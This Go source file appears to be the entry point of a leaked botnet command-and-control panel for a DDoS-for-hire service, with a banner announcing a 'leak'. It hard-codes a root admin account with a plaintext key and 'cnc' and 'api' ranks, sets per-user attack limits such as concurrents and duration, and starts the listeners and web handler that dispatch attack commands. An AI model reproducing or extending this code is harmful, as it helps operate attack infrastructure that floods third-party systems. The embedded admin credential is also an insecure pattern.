package main

import (
	"api/core"
	"api/core/database"
	"api/core/master"
	"api/core/models"
	"api/core/models/ranks"
	"api/core/models/servers"
	"api/core/net"
	"api/core/net/commands"
	"fmt"
	"github.com/janeczku/go-spinner"
	"log"
	"os"
	"os/exec"
	"time"
)

func main() {
	s := spinner.StartNew("Initializing")
	log.Println("BBOS COM LEAKS BEST LEAKS IN COM (:")
	core.Initialize()

	// Initialize the database
	if err := database.New(); err != nil {
		log.Println("failed to initialize database", err)
		return
	}

	// Create a new user in the database
	database.Container.NewUser(&database.User{
		ID:         0,
		Username:   "root",
		Key:        []byte("sbcsbcksb!~AZ"),
		Membership: "admin",
		Ranks: []*ranks.Rank{
			ranks.GetRole("admin", true),
			ranks.GetRole("vip", true),
			ranks.GetRole("api", true),
			ranks.GetRole("cnc", true),
		},
		Concurrents: 10,
		Duration:    200,
		Servers:     10,
		Balance:     1000,
		Expiry:      -1,
	})
	s.Stop()
	// If server configurations are enabled
	if models.Config.Server.Enabled {
		// Start necessary routines
		go net.Listener()   // Start net listener
		go servers.Listen() // Start server listener
		clearScreen()
		time.Sleep(5 * time.Millisecond)
		fmt.Printf("Loading Commands...\r\n")
		go commands.Init() // Initialize commands
		time.Sleep(5 * time.Millisecond)
		fmt.Printf("Loading Routers...\r\n")
		s := spinner.StartNew("running")
		master.NewV2() // Initialize webhandler
		s.Stop()
	} else {
		// Print message indicating CnC turned off
		fmt.Printf("[main] %s main.go CnC Turned Off!\n", time.Now().Format("15:04:05"))

		// Start server listener
		go servers.Listen()
		clearScreen()
		s := spinner.StartNew("running")
		master.NewV2() // Initialize webhandler
		s.Stop()
	}
}

// clear screen
func clearScreen() {
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
}
